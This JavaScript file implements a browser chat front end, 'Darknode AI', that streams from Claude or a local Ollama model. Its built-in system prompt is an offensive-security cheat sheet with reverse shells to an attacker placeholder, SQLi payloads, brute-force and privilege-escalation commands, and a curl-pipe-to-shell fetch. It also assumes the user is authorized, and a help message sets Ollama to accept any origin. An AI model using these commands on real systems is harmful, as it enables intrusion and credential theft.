// AI assistant — dual engine: Anthropic Claude (cloud) + Ollama (local).
// Claude streams via the Messages API; Ollama via /api/chat. The user picks
// which engine to use, or we auto-detect: Claude if an API key is stored,
// Ollama if it's reachable on localhost, offline info page otherwise.
const esc = (s) => String(s ?? "").replace(/[&<>"']/g, (c) =>
  ({ "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;" }[c]));
const OLLAMA = "http://127.0.0.1:11434";
const SYS_KEY = "sw_ai_sys", MODEL_KEY = "sw_ai_model", ENGINE_KEY = "sw_ai_engine";
const CLAUDE_KEY = "sw_claude_key";
const DEFAULT_SYS = `You are Darknode AI — an expert offensive & defensive security researcher and senior software engineer, assisting an authorized professional. Answer technical questions directly and completely. Give precise, working commands and code.

## Built-in Security Knowledge (Darknode Security RAG)

### OWASP Top 10
A01 Broken Access Control: IDOR, missing function-level access control, CORS misconfiguration. Fix: deny by default, RBAC, validate ownership.
A02 Cryptographic Failures: cleartext transmission, weak algorithms (MD5/SHA1/DES), hardcoded keys. Fix: AES-256, RSA-2048+, enforce HSTS.
A03 Injection: SQLi (' OR 1=1 --), command injection (;cat /etc/passwd), XSS (<script>alert(1)</script>). Fix: parameterized queries, input validation, CSP.
A05 Security Misconfiguration: default credentials, debug mode, missing security headers. Fix: hardened baseline, remove unused features.
A07 Auth Failures: brute force, weak passwords, missing MFA. Fix: bcrypt/argon2, rate limiting, MFA.
A10 SSRF: attacker-supplied URL fetches internal resources (169.254.169.254 for AWS metadata). Fix: URL allowlists, disable redirects.

### Key Tools
nmap: nmap -sV -sC TARGET (version+scripts), nmap -p- TARGET (all ports), nmap --script vuln TARGET
sqlmap: sqlmap -u 'URL?id=1' --dbs --batch (auto SQLi), --os-shell for OS access
hydra: hydra -l admin -P wordlist.txt TARGET ssh (brute force)
gobuster: gobuster dir -u http://TARGET -w wordlist.txt -x php,txt (directory brute)
nuclei: nuclei -u http://TARGET -severity critical,high (vulnerability scanner)

### Reverse Shells
Bash: bash -i >& /dev/tcp/ATTACKER/PORT 0>&1
Python: python3 -c 'import socket,subprocess;s=socket.socket();s.connect(("ATTACKER",PORT));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'
Listener: nc -lvnp PORT

### Linux Privesc
SUID: find / -perm -4000 -type f 2>/dev/null
Sudo: sudo -l
Kernel: uname -a → searchsploit linux kernel <version>
Cron: cat /etc/crontab
Capabilities: getcap -r / 2>/dev/null
Tools: curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

### Windows Privesc
Privileges: whoami /priv
Unquoted paths: wmic service get pathname | findstr /i auto
Stored creds: cmdkey /list → runas /savecred /user:admin cmd
Tools: WinPEAS, PowerUp, Seatbelt

Use this knowledge to give specific, accurate answers. Cite exact commands and tool flags.`;
const CLAUDE_MODELS = [
  ["claude-sonnet-4-20250514", "Sonnet 4"],
  ["claude-haiku-4-5-20251001", "Haiku 4.5"],
  ["claude-opus-4-20250514", "Opus 4"],
];
const getClaudeKey = () => { try { return (localStorage.getItem(CLAUDE_KEY) || "").trim(); } catch (_) { return ""; } };
const setClaudeKey = (k) => { try { k ? localStorage.setItem(CLAUDE_KEY, k) : localStorage.removeItem(CLAUDE_KEY); } catch (_) {} };
const getEngine = () => { try { return localStorage.getItem(ENGINE_KEY) || "auto"; } catch (_) { return "auto"; } };
const setEngine = (e) => { try { localStorage.setItem(ENGINE_KEY, e); } catch (_) {} };

async function getOllamaModels() {
  if (location.hostname !== "localhost" && location.hostname !== "127.0.0.1") return null;
  try { const r = await fetch(OLLAMA + "/api/tags"); const d = await r.json(); return (d.models || []).map((m) => m.name); } catch (_) { return null; }
}

async function streamOllama(model, messages, onToken, signal) {
  const r = await fetch(OLLAMA + "/api/chat", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ model, messages, stream: true }), signal });
  if (!r.ok || !r.body) throw new Error("Ollama returned " + r.status);
  const reader = r.body.getReader(), dec = new TextDecoder(); let buf = "";
  for (;;) {
    const { done, value } = await reader.read(); if (done) break;
    buf += dec.decode(value, { stream: true });
    let nl; while ((nl = buf.indexOf("\n")) >= 0) { const line = buf.slice(0, nl).trim(); buf = buf.slice(nl + 1); if (!line) continue; try { const j = JSON.parse(line); if (j.message && j.message.content) onToken(j.message.content); } catch (_) {} }
  }
}

async function streamClaude(model, messages, onToken, signal) {
  const key = getClaudeKey();
  if (!key) throw new Error("No Anthropic API key — add one in the engine settings.");
  const sys = messages.find((m) => m.role === "system");
  const msgs = messages.filter((m) => m.role !== "system").map((m) => {
    if (m.images && m.images.length) {
      return { role: m.role, content: [
        ...m.images.map((b) => ({ type: "image", source: { type: "base64", media_type: "image/png", data: b } })),
        { type: "text", text: m.content || "Describe this image." }
      ]};
    }
    return { role: m.role, content: m.content };
  });
  const r = await fetch("https://api.anthropic.com/v1/messages", {
    method: "POST", signal,
    headers: { "Content-Type": "application/json", "x-api-key": key, "anthropic-version": "2023-06-01", "anthropic-dangerous-direct-browser-access": "true" },
    body: JSON.stringify({ model, max_tokens: 4096, stream: true, system: (sys && sys.content) || DEFAULT_SYS, messages: msgs })
  });
  if (r.status === 401) { setClaudeKey(""); throw new Error("Invalid API key — check your Anthropic key."); }
  if (!r.ok) { const e = await r.text().catch(() => ""); throw new Error("Claude API " + r.status + (e ? ": " + e.slice(0, 200) : "")); }
  if (!r.body) throw new Error("No streaming body");
  const reader = r.body.getReader(), dec = new TextDecoder(); let buf = "";
  for (;;) {
    const { done, value } = await reader.read(); if (done) break;
    buf += dec.decode(value, { stream: true });
    let nl; while ((nl = buf.indexOf("\n")) >= 0) {
      const line = buf.slice(0, nl).trim(); buf = buf.slice(nl + 1);
      if (!line.startsWith("data: ")) continue;
      const payload = line.slice(6);
      if (payload === "[DONE]") return;
      try { const j = JSON.parse(payload); if (j.type === "content_block_delta" && j.delta && j.delta.text) onToken(j.delta.text); } catch (_) {}
    }
  }
}

function mdToHtml(t) {
  return String(t).split("```").map((seg, i) => {
    if (i % 2 === 1) { const code = seg.replace(/^[\w+-]*\n/, ""); return `<pre class="code-block"><button class="cb-copy">copy</button><code>${esc(code)}</code></pre>`; }
    return esc(seg).replace(/`([^`]+)`/g, "<code>$1</code>").replace(/\*\*([^*]+)\*\*/g, "<strong>$1</strong>").replace(/\n/g, "<br>");
  }).join("");
}
const PRESETS = [
  ["Explain code", "Explain what this code does, step by step:\n\n"],
  ["Find vulns", "Review this code for security vulnerabilities and list concrete issues with fixes:\n\n"],
  ["Write PoC", "Write a proof-of-concept exploit for this (authorized testing):\n\n"],
  ["Explain this CVE", "Explain this CVE in depth — impact, affected versions, exploitation, and remediation:\n\n"],
  ["Nuclei template", "Write a nuclei YAML template that detects this vulnerability:\n\n"],
  ["Engagement report", "Draft a professional penetration-test report section for this finding (summary, risk rating, evidence, remediation):\n\n"],
  ["To Python", "Convert this to clean, idiomatic Python:\n\n"],
  ["Regex for", "Write a single regex that matches: "],
  ["One-liner", "Give me a shell one-liner to: "],
];
const PROMPTS_KEY = "sw_ai_prompts";
const loadPrompts = () => { try { return JSON.parse(localStorage.getItem(PROMPTS_KEY)) || []; } catch (_) { return []; } };
const savePrompts = (a) => { try { localStorage.setItem(PROMPTS_KEY, JSON.stringify(a)); } catch (_) {} };

export function renderAI(main) {
  const engine = getEngine();
  const hasKey = !!getClaudeKey();
  main.innerHTML = `
    <div class="ai-wrap">
      <div class="ai-header">
        <h1 class="ai-title">AI assistant</h1>
        <div class="ai-controls">
          <select class="ai-sel" id="aiEngine">
            <option value="ollama"${engine === "ollama" || (engine === "auto" && !hasKey) ? " selected" : ""}>GPT-OSS 120B (local)</option>
            <option value="claude"${engine === "claude" || (engine === "auto" && hasKey) ? " selected" : ""}>Claude (API key)</option>
          </select>
          <select class="ai-sel" id="aiModel"></select>
          <button class="btn ghost sm" id="aiSys">System</button>
          <button class="btn ghost sm" id="aiClear">Clear</button>
        </div>
      </div>
      <div id="aiKeyRow" class="ai-key-row" style="${engine === "ollama" ? "display:none" : ""}">
        <input class="ai-key-input" id="aiKey" type="password" placeholder="Anthropic API key (sk-ant-...)" value="${hasKey ? "••••••••" : ""}">
        <button class="btn ghost sm" id="aiKeySave">${hasKey ? "Update" : "Save"}</button>
        ${hasKey ? `<button class="btn ghost sm" id="aiKeyDel">Remove</button>` : ""}
      </div>
      <div id="aiStatus" class="ai-status"></div>
      <div class="ai-chat" id="aiChat"><div class="ai-empty">Ask anything -- recon, exploitation, tooling, or code.</div></div>
      <div class="ai-presets" id="aiPresets"></div>
      <div id="aiThumbs" class="ai-thumbs"></div>
      <div class="ai-input-row">
        <textarea class="ai-input" id="aiMsg" rows="1" placeholder="Message Darknode AI..."></textarea>
        <button class="btn ghost sm" id="aiImg" title="Attach image">Image</button>
        <button class="btn sm" id="aiSend">Send</button>
      </div>
    </div>
    <input type="file" id="aiFile" accept="image/*" hidden>`;
  const $ = (s) => main.querySelector(s);
  try { const pf = sessionStorage.getItem("sw_ai_prefill"); if (pf) { sessionStorage.removeItem("sw_ai_prefill"); const box = $("#aiMsg"); box.value = pf + (box.value ? "\n\n" + box.value : ""); setTimeout(() => { box.focus(); box.selectionStart = box.selectionEnd = box.value.length; }, 0); } } catch (_) {}
  const chatEl = $("#aiChat"), sel = $("#aiModel"), status = $("#aiStatus"), engSel = $("#aiEngine");
  const history = [{ role: "system", content: localStorage.getItem(SYS_KEY) || DEFAULT_SYS }];

  function curEngine() { return engSel.value; }

  function populateModels() {
    const eng = curEngine();
    if (eng === "claude") {
      sel.innerHTML = CLAUDE_MODELS.map(([id, label]) => `<option value="${id}">${esc(label)}</option>`).join("");
      const saved = localStorage.getItem(MODEL_KEY);
      if (saved && CLAUDE_MODELS.some((m) => m[0] === saved)) sel.value = saved;
      const kr = $("#aiKeyRow"); if (kr) kr.style.display = "";
      if (getClaudeKey()) { status.textContent = "Claude ready."; }
      else { status.innerHTML = `Add your Anthropic API key above to start chatting.`; }
    } else {
      const kr = $("#aiKeyRow"); if (kr) kr.style.display = "none";
      (async () => {
        const ms = await getOllamaModels();
        if (ms === null) {
          sel.innerHTML = `<option value="auto-pull">gpt-oss:120b</option>`;
          status.textContent = "Ollama not detected -- will auto-install GPT-OSS 120B when you send your first message.";
        } else if (!ms.length) {
          sel.innerHTML = `<option value="auto-pull">gpt-oss:120b</option>`;
          status.textContent = "Ollama connected -- GPT-OSS 120B will auto-install when you send your first message.";
        } else {
          const pri = ["gpt-oss:120b", "gpt-oss:20b", "gpt-oss"];
          const sorted = [...ms].sort((a, b) => { const ai = pri.findIndex(p => a.startsWith(p)), bi = pri.findIndex(p => b.startsWith(p)); if (ai >= 0 && bi < 0) return -1; if (bi >= 0 && ai < 0) return 1; if (ai >= 0 && bi >= 0) return ai - bi; return 0; });
          sel.innerHTML = sorted.map((m) => `<option>${esc(m)}</option>`).join("");
          const saved = localStorage.getItem(MODEL_KEY); if (saved && ms.includes(saved)) sel.value = saved;
          const hasGptOss = ms.some(m => m.startsWith("gpt-oss"));
          status.textContent = "Connected." + (hasGptOss ? "" : " Tip: ollama pull gpt-oss:120b for the best local model.");
        }
      })();
    }
  }

  const showInfo = (title, bodyHtml) => {
    chatEl.innerHTML = `<div class="ai-offline">
      <div class="ai-offline-h">${title}</div>
      <div class="ai-offline-b">${bodyHtml}</div>
      <div class="ai-offline-cta"><button class="btn" data-sec="downloads">Get the desktop app</button></div>
    </div>`;
  };

  engSel.onchange = () => { setEngine(engSel.value); populateModels(); };
  populateModels();

  // API key management
  const keySave = $("#aiKeySave");
  if (keySave) keySave.onclick = () => {
    const v = $("#aiKey").value.trim();
    if (!v || v === "••••••••") { status.textContent = "Enter your API key first."; return; }
    setClaudeKey(v); $("#aiKey").value = "••••••••";
    status.textContent = "API key saved. Ready to chat.";
    renderAI(main);
  };
  const keyDel = $("#aiKeyDel");
  if (keyDel) keyDel.onclick = () => { setClaudeKey(""); renderAI(main); };

  sel.onchange = () => { try { localStorage.setItem(MODEL_KEY, sel.value); } catch (_) {} };
  $("#aiSys").onclick = () => {
    const v = prompt("System prompt — controls how the AI behaves:", localStorage.getItem(SYS_KEY) || DEFAULT_SYS);
    if (v !== null) { try { localStorage.setItem(SYS_KEY, v); } catch (_) {} history[0] = { role: "system", content: v }; status.textContent = "System prompt updated."; }
  };
  const add = (role, text) => { const d = document.createElement("div"); d.className = "msg " + (role === "user" ? "you" : "ai"); d.textContent = text; const empty = chatEl.querySelector(".ai-empty"); if (empty) empty.remove(); chatEl.appendChild(d); chatEl.scrollTop = chatEl.scrollHeight; return d; };

  let pending = [];
  const drawThumbs = () => { $("#aiThumbs").innerHTML = pending.map((b, i) => `<span class="ai-thumb"><img alt="attachment ${i + 1}" src="data:image/png;base64,${b}"><button data-rm="${i}" title="remove" aria-label="remove attachment ${i + 1}">&times;</button></span>`).join(""); };
  const addImage = (file) => { if (!file || !file.type.startsWith("image/")) return; const rd = new FileReader(); rd.onload = () => { pending.push(String(rd.result).split(",")[1]); drawThumbs(); }; rd.readAsDataURL(file); };
  $("#aiImg").onclick = () => $("#aiFile").click();
  $("#aiFile").onchange = (e) => { [...e.target.files].forEach(addImage); e.target.value = ""; };
  $("#aiThumbs").onclick = (e) => { const b = e.target.closest("[data-rm]"); if (b) { pending.splice(+b.dataset.rm, 1); drawThumbs(); } };
  $("#aiMsg").addEventListener("paste", (e) => { for (const it of e.clipboardData.items) if (it.type.startsWith("image/")) addImage(it.getAsFile()); });

  let busy = false, ctrl = null;
  async function send() {
    if (busy) return;
    const text = $("#aiMsg").value.trim(); const imgs = pending.slice(); if (!text && !imgs.length) return;
    const model = sel.value;
    const eng = curEngine();
    if (eng === "ollama" && (!model || model === "auto-pull" || model === "offline" || model === "none")) {
      const savedText = text; const savedImgs = imgs.slice();
      status.textContent = "Installing GPT-OSS 120B -- this only happens once...";
      const pullMsg = add("ai", ""); pullMsg.innerHTML = "Installing <strong>gpt-oss:120b</strong>. This only happens once...";
      try {
        const pr = await fetch(OLLAMA + "/api/pull", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ name: "gpt-oss:120b", stream: true }) });
        if (!pr.ok) throw new Error("pull failed (" + pr.status + ")");
        const reader = pr.body.getReader(), dec = new TextDecoder(); let buf = "";
        for (;;) {
          const { done, value } = await reader.read(); if (done) break;
          buf += dec.decode(value, { stream: true });
          let nl; while ((nl = buf.indexOf("\n")) >= 0) {
            const line = buf.slice(0, nl).trim(); buf = buf.slice(nl + 1);
            if (!line) continue;
            try { const j = JSON.parse(line); if (j.completed && j.total) { const pct = Math.round(j.completed / j.total * 100); pullMsg.innerHTML = "Installing <strong>gpt-oss:120b</strong>: " + pct + "%"; } else if (j.status) { pullMsg.innerHTML = esc(j.status); } } catch (_) {}
          }
        }
        pullMsg.remove();
        status.textContent = "GPT-OSS 120B ready.";
        populateModels();
        await new Promise(r => setTimeout(r, 300));
        const ms = await getOllamaModels();
        if (ms && ms.length) { sel.innerHTML = ms.map(m => `<option>${esc(m)}</option>`).join(""); sel.value = ms.find(m => m.startsWith("gpt-oss")) || ms[0]; }
        $("#aiMsg").value = savedText; pending = savedImgs; send();
      } catch (_) {
        pullMsg.innerHTML = "Ollama is not running. Open a terminal and run:<br><br><code>curl -fsSL https://ollama.com/install.sh | sh</code><br><code>OLLAMA_ORIGINS=* ollama serve</code><br><br>Then send your message again.";
        status.textContent = "";
      }
      return;
    }
    if (eng === "claude" && !getClaudeKey()) { status.textContent = "Add your Anthropic API key first."; return; }
    busy = true; ctrl = new AbortController(); const btn = $("#aiSend"); btn.textContent = "Stop"; $("#aiMsg").value = "";
    const um = { role: "user", content: text || "Read and transcribe any text in this image, then help with it." };
    if (imgs.length) um.images = imgs;
    history.push(um);
    const you = add("user", ""); you.innerHTML = imgs.map((b) => `<img class="msg-img" alt="attached image" src="data:image/png;base64,${b}">`).join("") + esc(text);
    pending = []; drawThumbs();
    if (imgs.length && eng === "ollama") status.textContent = "reading image (needs a vision model like minicpm-v or llava)…";
    const out = add("ai", "…"); let acc = "";
    try {
      const streamer = eng === "claude" ? streamClaude : streamOllama;
      await streamer(model, history, (t) => { acc += t; out.innerHTML = mdToHtml(acc); chatEl.scrollTop = chatEl.scrollHeight; }, ctrl.signal);
      history.push({ role: "assistant", content: acc || "" });
    }
    catch (e) { if (e.name === "AbortError") { out.innerHTML = mdToHtml(acc) + `<div class="muted" style="font-size:.72rem;margin-top:4px">stopped</div>`; history.push({ role: "assistant", content: acc || "" }); } else { out.textContent = "Error: " + e.message; out.classList.add("err"); if (history[history.length - 1] === um) history.pop(); } }
    finally { busy = false; ctrl = null; const b = $("#aiSend"); b.textContent = "Send"; if (status.textContent.startsWith("reading image")) status.textContent = ""; $("#aiMsg").focus(); }
  }
  $("#aiSend").onclick = () => { if (busy && ctrl) ctrl.abort(); else send(); };
  $("#aiClear").onclick = () => { if (busy && ctrl) ctrl.abort(); history.length = 1; chatEl.innerHTML = `<div class="ai-empty">Ask anything -- recon, exploitation, tooling, or code.</div>`; };
  $("#aiMsg").onkeydown = (e) => { if (e.key === "Enter" && !e.shiftKey) { e.preventDefault(); send(); } };
  let userPrompts = loadPrompts();
  const drawPresets = () => {
    $("#aiPresets").innerHTML =
      PRESETS.map((p, i) => `<button class="chip" data-p="${i}">${esc(p[0])}</button>`).join("") +
      userPrompts.map((p, i) => `<button class="chip chip-user" data-u="${i}">${esc(p[0])}<span class="chip-x" data-del="${i}" title="remove">&times;</span></button>`).join("") +
      `<button class="chip chip-add" data-add="1">+ Save prompt</button>`;
  };
  drawPresets();
  const insert = (text) => { const box = $("#aiMsg"); box.value = text + box.value; box.focus(); box.selectionStart = box.selectionEnd = box.value.length; };
  $("#aiPresets").onclick = (e) => {
    const del = e.target.closest("[data-del]");
    if (del) { e.stopPropagation(); userPrompts.splice(+del.dataset.del, 1); savePrompts(userPrompts); drawPresets(); return; }
    const addb = e.target.closest("[data-add]");
    if (addb) { const label = prompt("Preset name:"); if (!label) return; const text = prompt("Prompt text (inserted before your message):"); if (text == null) return; userPrompts.push([label.trim(), text]); savePrompts(userPrompts); drawPresets(); return; }
    const u = e.target.closest("[data-u]"); if (u) return insert(userPrompts[+u.dataset.u][1]);
    const b = e.target.closest("[data-p]"); if (b) insert(PRESETS[+b.dataset.p][1]);
  };
  chatEl.addEventListener("click", (e) => {
    const nav = e.target.closest("[data-sec]");
    if (nav) { const it = document.querySelector('.side-item[data-sec="' + nav.dataset.sec + '"]'); if (it) it.click(); return; }
    const b = e.target.closest(".cb-copy"); if (!b) return; const code = b.parentElement.querySelector("code"); navigator.clipboard?.writeText(code.textContent).then(() => { b.textContent = "copied"; setTimeout(() => (b.textContent = "copy"), 1000); }); });
}
